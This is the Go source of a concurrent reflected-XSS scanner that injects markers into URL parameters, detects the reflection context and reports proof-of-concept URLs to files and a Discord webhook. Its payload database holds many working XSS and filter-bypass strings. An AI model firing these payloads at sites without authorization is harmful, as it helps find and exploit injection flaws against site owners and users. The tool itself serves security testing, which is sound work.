package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Config holds the scanner configuration
type Config struct {
	DiscordWebhook string
	Concurrency    int
	Timeout        int
	OutputDir      string
}

// XSSContext represents where the reflection occurs
type XSSContext int

const (
	ContextUnknown XSSContext = iota
	ContextHTMLBody
	ContextHTMLAttribute
	ContextJavaScript
	ContextJavaScriptString
	ContextURLContext
	ContextHTMLComment
)

// Vulnerability represents a confirmed XSS vulnerability
type Vulnerability struct {
	URL             string
	Parameter       string
	Context         XSSContext
	Payload         string
	POCURL          string
	ReflectionPoint string
}

// Stats tracks scanning progress
type Stats struct {
	total     int64
	tested    int64
	reflected int64
	vulnerable int64
	startTime time.Time
	mu        sync.Mutex
}

var (
	stats         Stats
	seenVulns     sync.Map
	discordMu     sync.Mutex
	config        Config
)

// Payload database with context-aware payloads
var payloadDatabase = map[XSSContext][]string{
	ContextHTMLBody: {
		// XML-compatible SVG payloads (tested first for XML responses)
		// User-confirmed working payload for XML endpoints
		`<svg xmlns="http://www.w3.org/2000/svg"><script>prompt("XSS")</script></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><script>confirm("XSS")</script></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><script>prompt(1)</script></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><script>confirm(1)</script></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)"/></svg>`,
		`<svg xmlns="http://www.w3.org/2000/svg"><set onbegin="alert(1)"/></svg>`,

		// Basic payloads
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,

		// Event handler payloads
		`<body onload=alert(1)>`,
		`<input onfocus=alert(1) autofocus>`,
		`<select onfocus=alert(1) autofocus>`,
		`<textarea onfocus=alert(1) autofocus>`,
		`<keygen onfocus=alert(1) autofocus>`,
		`<video><source onerror="alert(1)">`,
		`<audio src=x onerror=alert(1)>`,

		// WAF bypass - case mixing
		`<ScRiPt>alert(1)</sCrIpT>`,
		`<IMG SRC=x OnErRoR=alert(1)>`,

		// WAF bypass - encoding
		`<img src=x onerror="alert(1)">`,
		`<img src=x onerror='alert(1)'>`,
		`<img src=x onerror=alert&#40;1&#41;>`,
		`<img src=x onerror=alert&#x28;1&#x29;>`,

		// WAF bypass - no quotes
		`<svg/onload=alert(1)>`,
		`<img/src=x/onerror=alert(1)>`,

		// WAF bypass - advanced
		`<iframe srcdoc="<script>alert(1)</script>">`,
		`<object data="javascript:alert(1)">`,
		`<embed src="javascript:alert(1)">`,
		`<marquee onstart=alert(1)>`,
		`<details open ontoggle=alert(1)>`,

		// Polyglot-style payloads
		`'"><script>alert(1)</script>`,
		`'"--></script><script>alert(1)</script>`,
		`</script><script>alert(1)</script>`,
	},

	ContextHTMLAttribute: {
		// Break out of attribute
		`" onload="alert(1)`,
		`' onload='alert(1)`,
		`" onfocus="alert(1)" autofocus="`,
		`' onfocus='alert(1)' autofocus='`,

		// Without quotes
		`onload=alert(1)`,
		`onfocus=alert(1) autofocus`,

		// Close tag and inject
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`><img src=x onerror=alert(1)>`,

		// Event handlers
		`" onmouseover="alert(1)`,
		`' onmouseover='alert(1)`,
		`" onclick="alert(1)`,

		// WAF bypass
		`"OnClIcK="alert(1)`,
		`"/**/onload="alert(1)`,
		`"%20onload="alert(1)`,
		`"/onload="alert(1)`,
	},

	ContextJavaScriptString: {
		// Break out of string
		`";alert(1)//`,
		`';alert(1)//`,
		`";alert(1);"`,
		`';alert(1);'`,

		// Close script and reopen
		`</script><script>alert(1)</script><script>`,

		// Unicode escape
		`\u0022;alert(1)//`,
		`\x22;alert(1)//`,

		// Newline injection
		`\nalert(1)//`,
		`\ralert(1)//`,
		`</script><script>alert(1)</script>`,
	},

	ContextJavaScript: {
		// Direct injection
		`alert(1)`,
		`alert(1)//`,
		`alert(1);`,
		`(alert)(1)`,
		`[1].find(alert)`,
		`window['alert'](1)`,
		`self['alert'](1)`,
		`top['alert'](1)`,
		`parent['alert'](1)`,

		// WAF bypass
		`window['\x61\x6c\x65\x72\x74'](1)`,
		`eval('alert(1)')`,
		`eval(atob('YWxlcnQoMSk='))`,
		`Function('alert(1)')()`,
		`setTimeout('alert(1)')`,
		`setInterval('alert(1)')`,
	},

	ContextURLContext: {
		`javascript:alert(1)`,
		`javascript:alert(1)//`,
		`javascript:void(alert(1))`,
		`javascript:void(0);alert(1)`,
		`javascript:%61%6c%65%72%74(1)`,
		`javascript:alert&#40;1&#41;`,
		`data:text/html,<script>alert(1)</script>`,
		`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
	},
}

func main() {
	urlFile := flag.String("f", "", "File containing URLs to test (required)")
	concurrency := flag.Int("c", 50, "Number of concurrent requests")
	timeout := flag.Int("t", 10, "HTTP timeout in seconds")
	discordWebhook := flag.String("discord", "", "Discord webhook URL for notifications")
	outputDir := flag.String("o", "", "Output directory to save results")
	flag.Parse()

	if *urlFile == "" {
		fmt.Println("Usage: xss-scanner -f <url-file> [-c concurrency] [-t timeout] [-discord webhook-url] [-o output-dir]")
		fmt.Println("\nExample:")
		fmt.Println("  xss-scanner -f urls.txt -c 50 -discord https://discord.com/api/webhooks/...")
		fmt.Println("  xss-scanner -f urls.txt -o results")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Load config from config.sh if exists
	loadConfig()

	// Override with command line args
	config.Concurrency = *concurrency
	config.Timeout = *timeout
	if *discordWebhook != "" {
		config.DiscordWebhook = *discordWebhook
	}
	if *outputDir != "" {
		config.OutputDir = *outputDir
	}

	if config.DiscordWebhook != "" {
		fmt.Printf("[+] Discord notifications enabled\n")
	}

	// Create output directory if specified
	if config.OutputDir != "" {
		if err := os.MkdirAll(config.OutputDir, 0755); err != nil {
			fmt.Printf("[-] Error creating output directory: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] Results will be saved to: %s\n", config.OutputDir)
	}

	// Read URLs from file
	urls, err := readURLs(*urlFile)
	if err != nil {
		fmt.Printf("[-] Error reading URLs: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Loaded %d URLs\n", len(urls))

	// Filter URLs with parameters
	urlsWithParams := filterURLsWithParams(urls)
	fmt.Printf("[+] Found %d URLs with parameters\n", len(urlsWithParams))

	if len(urlsWithParams) == 0 {
		fmt.Println("[-] No URLs with parameters found. XSS testing requires parameters.")
		os.Exit(1)
	}

	stats.total = int64(len(urlsWithParams))
	stats.startTime = time.Now()

	// Start progress reporter
	go reportProgress()

	// Scan URLs
	scanURLs(urlsWithParams)

	// Final stats
	fmt.Printf("\n[+] Scan complete!\n")
	fmt.Printf("[+] Total URLs: %d\n", stats.total)
	fmt.Printf("[+] Tested: %d\n", atomic.LoadInt64(&stats.tested))
	fmt.Printf("[+] Reflected: %d\n", atomic.LoadInt64(&stats.reflected))
	fmt.Printf("[+] Vulnerable: %d\n", atomic.LoadInt64(&stats.vulnerable))
	fmt.Printf("[+] Time taken: %s\n", time.Since(stats.startTime).Round(time.Second))
}

func loadConfig() {
	// Try to load config from ../config.sh
	configFile := "../config.sh"
	data, err := os.ReadFile(configFile)
	if err != nil {
		return
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "DISCORD_WEBHOOK=") {
			webhook := strings.TrimPrefix(line, "DISCORD_WEBHOOK=")
			webhook = strings.Trim(webhook, "\"'")
			config.DiscordWebhook = webhook
		}
	}
}

func readURLs(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			// Ensure URL has protocol
			if !strings.HasPrefix(strings.ToLower(line), "http://") &&
			   !strings.HasPrefix(strings.ToLower(line), "https://") {
				line = "http://" + line
			}
			urls = append(urls, line)
		}
	}
	return urls, scanner.Err()
}

func filterURLsWithParams(urls []string) []string {
	var filtered []string
	for _, u := range urls {
		parsed, err := url.Parse(u)
		if err != nil {
			continue
		}
		// Only test URLs with query parameters
		if len(parsed.Query()) > 0 {
			filtered = append(filtered, u)
		}
	}
	return filtered
}

func scanURLs(urls []string) {
	semaphore := make(chan struct{}, config.Concurrency)
	var wg sync.WaitGroup

	for _, targetURL := range urls {
		wg.Add(1)
		semaphore <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-semaphore }()

			testURL(u)
			atomic.AddInt64(&stats.tested, 1)
		}(targetURL)
	}

	wg.Wait()
}

func testURL(targetURL string) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	params := parsed.Query()
	if len(params) == 0 {
		return
	}

	// Test each parameter
	for param := range params {
		testParameter(targetURL, param)
	}
}

func testParameter(targetURL, param string) {
	// Generate unique marker
	marker := generateMarker()

	// Inject marker
	testURLWithMarker := injectMarker(targetURL, param, marker)

	// Make request
	resp, body, err := makeRequest(testURLWithMarker)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Check if marker is reflected
	if !strings.Contains(body, marker) {
		return
	}

	atomic.AddInt64(&stats.reflected, 1)

	// Detect context
	context := detectContext(body, marker)

	// Test payloads for this context
	testPayloadsForContext(targetURL, param, context, marker)
}

func generateMarker() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 12)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return "xss" + string(b)
}

func injectMarker(targetURL, param, marker string) string {
	parsed, _ := url.Parse(targetURL)
	q := parsed.Query()
	q.Set(param, marker)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func makeRequest(targetURL string) (*http.Response, string, error) {
	client := &http.Client{
		Timeout: time.Duration(config.Timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	resp, err := client.Get(targetURL)
	if err != nil {
		return nil, "", err
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		resp.Body.Close()
		return nil, "", err
	}

	// Reset body for potential re-reading
	resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))

	return resp, string(bodyBytes), nil
}

func detectContext(body, marker string) XSSContext {
	markerLower := strings.ToLower(marker)
	bodyLower := strings.ToLower(body)

	// Check if in HTML comment
	commentRegex := regexp.MustCompile(`<!--[^>]*` + regexp.QuoteMeta(markerLower) + `[^>]*-->`)
	if commentRegex.MatchString(bodyLower) {
		return ContextHTMLComment
	}

	// Check if in JavaScript context
	scriptRegex := regexp.MustCompile(`<script[^>]*>.*?` + regexp.QuoteMeta(markerLower) + `.*?</script>`)
	if scriptRegex.MatchString(bodyLower) {
		// Check if in string
		jsStringRegex := regexp.MustCompile(`["'\x60].*?` + regexp.QuoteMeta(markerLower) + `.*?["'\x60]`)
		if jsStringRegex.MatchString(body) {
			return ContextJavaScriptString
		}
		return ContextJavaScript
	}

	// Check if in HTML attribute
	attrRegex := regexp.MustCompile(`<[^>]+\s+\w+\s*=\s*["']?[^"'>]*` + regexp.QuoteMeta(markerLower) + `[^"'>]*["']?[^>]*>`)
	if attrRegex.MatchString(bodyLower) {
		return ContextHTMLAttribute
	}

	// Check if in URL context (href, src, action, etc.)
	urlAttrRegex := regexp.MustCompile(`<[^>]+\s+(href|src|action|data|formaction)\s*=\s*["']?[^"'>]*` + regexp.QuoteMeta(markerLower) + `[^"'>]*["']?[^>]*>`)
	if urlAttrRegex.MatchString(bodyLower) {
		return ContextURLContext
	}

	// Default to HTML body
	return ContextHTMLBody
}

func testPayloadsForContext(targetURL, param string, context XSSContext, originalMarker string) {
	// Skip HTML comments - not exploitable
	if context == ContextHTMLComment {
		return
	}

	payloads, ok := payloadDatabase[context]
	if !ok {
		// Fallback to HTML body payloads
		payloads = payloadDatabase[ContextHTMLBody]
	}

	// Test each payload
	for _, payload := range payloads {
		success, pocURL := testPayload(targetURL, param, payload, context)
		if success {
			atomic.AddInt64(&stats.vulnerable, 1)

			vuln := Vulnerability{
				URL:       targetURL,
				Parameter: param,
				Context:   context,
				Payload:   payload,
				POCURL:    pocURL,
			}

			// Check if already reported
			key := vuln.URL + ":" + vuln.Parameter
			if _, exists := seenVulns.LoadOrStore(key, true); !exists {
				reportVulnerability(vuln)
			}

			// Found one working payload, no need to test more
			break
		}
	}
}

func testPayload(targetURL, param, payload string, context XSSContext) (bool, string) {
	// Inject payload
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return false, ""
	}

	q := parsed.Query()
	q.Set(param, payload)
	parsed.RawQuery = q.Encode()
	testURL := parsed.String()

	// Make request
	resp, body, err := makeRequest(testURL)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()

	// Validate if payload is present AND in exploitable position
	if validateXSS(resp, body, payload, context) {
		return true, testURL
	}
	return false, ""
}

func validateXSS(resp *http.Response, body string, payload string, context XSSContext) bool {
	bodyLower := strings.ToLower(body)
	payloadLower := strings.ToLower(payload)

	// CRITICAL CHECK 1: Validate Content-Type (Eliminates most false positives)
	// Browsers won't execute JavaScript in non-HTML content types
	contentType := strings.ToLower(resp.Header.Get("Content-Type"))
	if strings.Contains(contentType, "application/json") ||
	   strings.Contains(contentType, "text/plain") ||
	   strings.Contains(contentType, "application/xml") ||
	   strings.Contains(contentType, "text/xml") {
		return false
	}

	// Check X-Content-Type-Options: nosniff header
	// This prevents MIME type sniffing, so wrong content-type = no execution
	if resp.Header.Get("X-Content-Type-Options") == "nosniff" {
		return false
	}

	// Check if payload is in response
	if !strings.Contains(bodyLower, payloadLower) && !containsPartialPayload(bodyLower, payloadLower) {
		return false
	}

	// CRITICAL CHECK 2: Verify payload is not HTML-encoded
	if isPayloadHTMLEncoded(body, payload) {
		return false
	}

	// Context-specific validation
	switch context {
	case ContextHTMLBody:
		// STRUCTURAL VALIDATION: Verify complete payload structure exists

		// For SVG payloads with script tags
		if strings.Contains(payloadLower, "<svg") && strings.Contains(payloadLower, "xmlns") {
			// Must have: <svg + xmlns + <script> + alert/prompt + </script> + </svg>
			if !strings.Contains(bodyLower, "<svg") {
				return false
			}
			if !strings.Contains(bodyLower, "xmlns") {
				return false
			}
			if !strings.Contains(bodyLower, "<script>") || !strings.Contains(bodyLower, "</script>") {
				return false
			}
			// Verify script tags appear in correct order (open before close)
			scriptOpenIdx := strings.Index(bodyLower, "<script>")
			scriptCloseIdx := strings.Index(bodyLower, "</script>")
			if scriptOpenIdx == -1 || scriptCloseIdx == -1 || scriptOpenIdx >= scriptCloseIdx {
				return false
			}
			// Verify executable code between script tags
			scriptContent := bodyLower[scriptOpenIdx+8:scriptCloseIdx]
			if !strings.Contains(scriptContent, "alert") &&
			   !strings.Contains(scriptContent, "prompt") &&
			   !strings.Contains(scriptContent, "confirm") {
				return false
			}
			// Verify closing </svg> exists
			if !strings.Contains(bodyLower, "</svg>") {
				return false
			}
			return true
		}

		// For regular script tags
		if strings.Contains(payloadLower, "<script>") {
			if !strings.Contains(bodyLower, "<script>") || !strings.Contains(bodyLower, "</script>") {
				return false
			}
			scriptOpenIdx := strings.Index(bodyLower, "<script>")
			scriptCloseIdx := strings.Index(bodyLower, "</script>")
			if scriptOpenIdx >= scriptCloseIdx {
				return false
			}
			scriptContent := bodyLower[scriptOpenIdx+8:scriptCloseIdx]
			if !strings.Contains(scriptContent, "alert") &&
			   !strings.Contains(scriptContent, "prompt") &&
			   !strings.Contains(scriptContent, "confirm") {
				return false
			}
			return true
		}

		// For img/event handlers
		if strings.Contains(payloadLower, "<img") && strings.Contains(payloadLower, "onerror") {
			if strings.Contains(bodyLower, "<img") &&
			   strings.Contains(bodyLower, "onerror") &&
			   (strings.Contains(bodyLower, "alert") || strings.Contains(bodyLower, "prompt")) {
				return true
			}
		}

		// For other event handlers
		if strings.Contains(payloadLower, "onload=") ||
		   strings.Contains(payloadLower, "onfocus=") {
			return true
		}

	case ContextHTMLAttribute:
		// Check if we broke out of attribute or injected event handler
		if strings.Contains(payloadLower, `"`) ||
		   strings.Contains(payloadLower, `'`) ||
		   strings.Contains(payloadLower, "onload") ||
		   strings.Contains(payloadLower, "onfocus") ||
		   strings.Contains(payloadLower, "onclick") {
			return true
		}

	case ContextJavaScriptString:
		// CRITICAL: JavaScript String context is the trickiest and most prone to false positives
		// We need to verify the payload ACTUALLY breaks out of the string

		// For </script><script>alert(1)</script> payload to work:
		// 1. The closing </script> must appear in response
		// 2. A NEW <script> tag must appear that would execute
		// Both must be unencoded (not &lt;script&gt;)

		if strings.Contains(payloadLower, "</script>") {
			// Verify the closing </script> actually appears unencoded in response
			if strings.Contains(bodyLower, "</script>") {
				// Verify a new <script> tag appears after it
				if strings.Contains(bodyLower, "</script>") && strings.Contains(bodyLower, "<script>") {
					// Check they appear in the right order (close then open)
					closeIdx := strings.Index(bodyLower, "</script>")
					openIdx := strings.LastIndex(bodyLower, "<script>")
					if openIdx > closeIdx {
						return true
					}
				}
			}
		}

		// For ";alert(1)// or ';alert(1)// payloads
		// This is where most false positives occur!
		// We need to verify the quote ACTUALLY breaks out of the string

		if strings.Contains(payloadLower, `";`) || strings.Contains(payloadLower, `';`) {
			// CRITICAL CHECK 1: Make sure the quote is NOT escaped
			// If we find \"; or \'; then the quote is escaped and doesn't break out
			if strings.Contains(body, `\";`) || strings.Contains(body, `\';`) ||
			   strings.Contains(body, `\\";`) || strings.Contains(body, `\\';`) {
				return false  // Quote is escaped, still inside string
			}

			// CRITICAL CHECK 2: Verify we're not in a JSON context
			// JSON objects like {"param": "\";alert(1)//"} don't execute
			// Look for patterns that indicate JSON object: {"key": "value"}

			// Find where our payload appears
			payloadIdx := strings.Index(body, payload)
			if payloadIdx == -1 {
				payloadIdx = strings.Index(strings.ToLower(body), strings.ToLower(payload))
			}

			if payloadIdx != -1 {
				// Check 50 characters before payload for JSON indicators
				startCheck := payloadIdx - 50
				if startCheck < 0 {
					startCheck = 0
				}
				contextBefore := body[startCheck:payloadIdx]

				// If we see ": " right before our payload, we're likely in JSON
				// e.g., {"utm_source": "PAYLOAD"}
				if strings.HasSuffix(strings.TrimSpace(contextBefore), `:`) ||
				   strings.HasSuffix(strings.TrimSpace(contextBefore), `":`) {
					return false  // In JSON object, not executable JavaScript
				}

				// Check if surrounded by JSON object notation
				if strings.Contains(contextBefore, `{`) &&
				   (strings.Contains(contextBefore, `"`) || strings.Contains(contextBefore, `'`)) {
					// Likely in JSON object
					// Additional check: see if there's a closing } after the payload
					endCheck := payloadIdx + len(payload) + 50
					if endCheck > len(body) {
						endCheck = len(body)
					}
					contextAfter := body[payloadIdx:endCheck]
					if strings.Contains(contextAfter, `}`) {
						return false  // Confirmed JSON object context
					}
				}
			}

			// CRITICAL CHECK 3: Verify alert appears AFTER the quote and semicolon
			// and not still inside a string
			// Pattern should be: ";alert(1) with alert OUTSIDE quotes

			// This is a conservative check: only accept if we're very confident
			// the payload broke out of the string context
			return false  // Too risky - reject by default for JavaScript String unless we have strong evidence
		}

	case ContextJavaScript:
		// Direct JavaScript execution
		if strings.Contains(payloadLower, "alert") ||
		   strings.Contains(payloadLower, "eval") ||
		   strings.Contains(payloadLower, "function") {
			return true
		}

	case ContextURLContext:
		// Check for javascript: protocol
		if strings.Contains(payloadLower, "javascript:") ||
		   strings.Contains(payloadLower, "data:text/html") {
			return true
		}
	}

	return false
}

// isPayloadHTMLEncoded checks if the specific payload is HTML-encoded in the response
func isPayloadHTMLEncoded(body, payload string) bool {
	// Check for common HTML encoding patterns that would break the payload

	// Check if < is encoded as &lt;
	if strings.Contains(payload, "<") {
		encodedPayload := strings.ReplaceAll(payload, "<", "&lt;")
		if strings.Contains(body, encodedPayload) {
			return true
		}
		// Also check for other encoding variants
		encodedPayload = strings.ReplaceAll(payload, "<", "&#60;")
		if strings.Contains(body, encodedPayload) {
			return true
		}
		encodedPayload = strings.ReplaceAll(payload, "<", "&#x3c;")
		if strings.Contains(strings.ToLower(body), strings.ToLower(encodedPayload)) {
			return true
		}
	}

	// Check if > is encoded as &gt;
	if strings.Contains(payload, ">") {
		encodedPayload := strings.ReplaceAll(payload, ">", "&gt;")
		if strings.Contains(body, encodedPayload) {
			return true
		}
		encodedPayload = strings.ReplaceAll(payload, ">", "&#62;")
		if strings.Contains(body, encodedPayload) {
			return true
		}
	}

	// Check if " is encoded
	if strings.Contains(payload, `"`) {
		encodedPayload := strings.ReplaceAll(payload, `"`, "&quot;")
		if strings.Contains(body, encodedPayload) {
			return true
		}
		encodedPayload = strings.ReplaceAll(payload, `"`, "&#34;")
		if strings.Contains(body, encodedPayload) {
			return true
		}
	}

	// Check if ' is encoded
	if strings.Contains(payload, `'`) {
		encodedPayload := strings.ReplaceAll(payload, `'`, "&#39;")
		if strings.Contains(body, encodedPayload) {
			return true
		}
		encodedPayload = strings.ReplaceAll(payload, `'`, "&#x27;")
		if strings.Contains(strings.ToLower(body), strings.ToLower(encodedPayload)) {
			return true
		}
	}

	return false
}

func containsPartialPayload(body, payload string) bool {
	// Check if payload components are present (for encoded payloads)
	keywords := []string{"alert", "script", "onerror", "onload", "svg", "img"}
	count := 0
	for _, keyword := range keywords {
		if strings.Contains(payload, keyword) && strings.Contains(body, keyword) {
			count++
		}
	}
	return count >= 2
}

func reportVulnerability(vuln Vulnerability) {
	contextName := getContextName(vuln.Context)

	fmt.Printf("\n[!] VULNERABLE: %s\n", vuln.URL)
	fmt.Printf("    Parameter: %s\n", vuln.Parameter)
	fmt.Printf("    Context: %s\n", contextName)
	fmt.Printf("    Payload: %s\n", vuln.Payload)
	fmt.Printf("    POC URL: %s\n", vuln.POCURL)

	if config.DiscordWebhook != "" {
		sendDiscordNotification(vuln)
	}

	// Save to file if output directory is specified
	if config.OutputDir != "" {
		saveVulnerabilityToFile(vuln, contextName)
	}
}

func saveVulnerabilityToFile(vuln Vulnerability, contextName string) {
	// Create a safe filename from URL
	timestamp := time.Now().Format("20060102-150405")
	parsedURL, _ := url.Parse(vuln.URL)
	hostname := parsedURL.Host
	if hostname == "" {
		hostname = "unknown"
	}

	// Replace unsafe characters
	safeHostname := strings.ReplaceAll(hostname, ":", "_")
	safeHostname = strings.ReplaceAll(safeHostname, "/", "_")
	safeParam := strings.ReplaceAll(vuln.Parameter, "/", "_")
	safeParam = strings.ReplaceAll(safeParam, ":", "_")

	baseFilename := fmt.Sprintf("%s_%s_%s_%s", timestamp, safeHostname, safeParam, strings.ReplaceAll(contextName, " ", "_"))

	// Save as JSON
	jsonFilename := filepath.Join(config.OutputDir, baseFilename+".json")
	jsonData := map[string]interface{}{
		"timestamp": time.Now().Format(time.RFC3339),
		"url":       vuln.URL,
		"parameter": vuln.Parameter,
		"context":   contextName,
		"payload":   vuln.Payload,
		"poc_url":   vuln.POCURL,
	}

	jsonBytes, err := json.MarshalIndent(jsonData, "", "  ")
	if err == nil {
		os.WriteFile(jsonFilename, jsonBytes, 0644)
	}

	// Save as text
	txtFilename := filepath.Join(config.OutputDir, baseFilename+".txt")
	textData := fmt.Sprintf(`XSS Vulnerability Report
========================
Timestamp: %s
URL: %s
Parameter: %s
Context: %s
Payload: %s

POC (Proof of Concept):
Copy and paste this URL in your browser to test:
%s

Reproduction Steps:
1. Copy the POC URL above
2. Paste it in your browser's address bar
3. Press Enter
4. The XSS payload should execute

Severity: High (Reflected XSS)
`,
		time.Now().Format(time.RFC3339),
		vuln.URL,
		vuln.Parameter,
		contextName,
		vuln.Payload,
		vuln.POCURL,
	)

	os.WriteFile(txtFilename, []byte(textData), 0644)

	// Append to summary file
	summaryFilename := filepath.Join(config.OutputDir, "summary.txt")
	summaryEntry := fmt.Sprintf("[%s] %s | Param: %s | Context: %s | Payload: %s | POC: %s\n",
		time.Now().Format("2006-01-02 15:04:05"),
		vuln.URL,
		vuln.Parameter,
		contextName,
		vuln.Payload,
		vuln.POCURL,
	)

	f, err := os.OpenFile(summaryFilename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(summaryEntry)
		f.Close()
	}

	// Append to JSON summary file
	jsonSummaryFilename := filepath.Join(config.OutputDir, "summary.json")
	var allVulns []map[string]interface{}

	// Read existing vulnerabilities
	if existingData, err := os.ReadFile(jsonSummaryFilename); err == nil {
		json.Unmarshal(existingData, &allVulns)
	}

	// Append new vulnerability
	allVulns = append(allVulns, jsonData)

	// Write back
	if jsonBytes, err := json.MarshalIndent(allVulns, "", "  "); err == nil {
		os.WriteFile(jsonSummaryFilename, jsonBytes, 0644)
	}
}

func getContextName(context XSSContext) string {
	switch context {
	case ContextHTMLBody:
		return "HTML Body"
	case ContextHTMLAttribute:
		return "HTML Attribute"
	case ContextJavaScript:
		return "JavaScript"
	case ContextJavaScriptString:
		return "JavaScript String"
	case ContextURLContext:
		return "URL Context"
	case ContextHTMLComment:
		return "HTML Comment"
	default:
		return "Unknown"
	}
}

func sendDiscordNotification(vuln Vulnerability) {
	discordMu.Lock()
	defer discordMu.Unlock()

	contextName := getContextName(vuln.Context)

	embed := map[string]interface{}{
		"title":       "🚨 XSS Vulnerability Found",
		"description": fmt.Sprintf("Reflected XSS detected in **%s**", vuln.Parameter),
		"color":       15158332, // Red color
		"fields": []map[string]interface{}{
			{
				"name":   "URL",
				"value":  fmt.Sprintf("```%s```", vuln.URL),
				"inline": false,
			},
			{
				"name":   "Parameter",
				"value":  fmt.Sprintf("`%s`", vuln.Parameter),
				"inline": true,
			},
			{
				"name":   "Context",
				"value":  contextName,
				"inline": true,
			},
			{
				"name":   "Payload",
				"value":  fmt.Sprintf("```%s```", vuln.Payload),
				"inline": false,
			},
			{
				"name":   "POC URL",
				"value":  fmt.Sprintf("```%s```", vuln.POCURL),
				"inline": false,
			},
		},
		"timestamp": time.Now().Format(time.RFC3339),
	}

	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{embed},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}

	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("POST", config.DiscordWebhook, bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Rate limiting
	time.Sleep(500 * time.Millisecond)
}

func reportProgress() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		tested := atomic.LoadInt64(&stats.tested)
		if tested == 0 {
			continue
		}

		elapsed := time.Since(stats.startTime).Seconds()
		rate := float64(tested) / elapsed
		remaining := stats.total - tested
		eta := time.Duration(float64(remaining)/rate) * time.Second

		percentage := float64(tested) / float64(stats.total) * 100

		fmt.Printf("\r[*] Progress: %d/%d (%.1f%%) | Rate: %.0f URLs/s | Reflected: %d | Vulnerable: %d | ETA: %s     ",
			tested, stats.total, percentage, rate,
			atomic.LoadInt64(&stats.reflected),
			atomic.LoadInt64(&stats.vulnerable),
			eta.Round(time.Second))

		if tested >= stats.total {
			break
		}
	}
}

func init() {
	rand.Seed(time.Now().UnixNano())
}
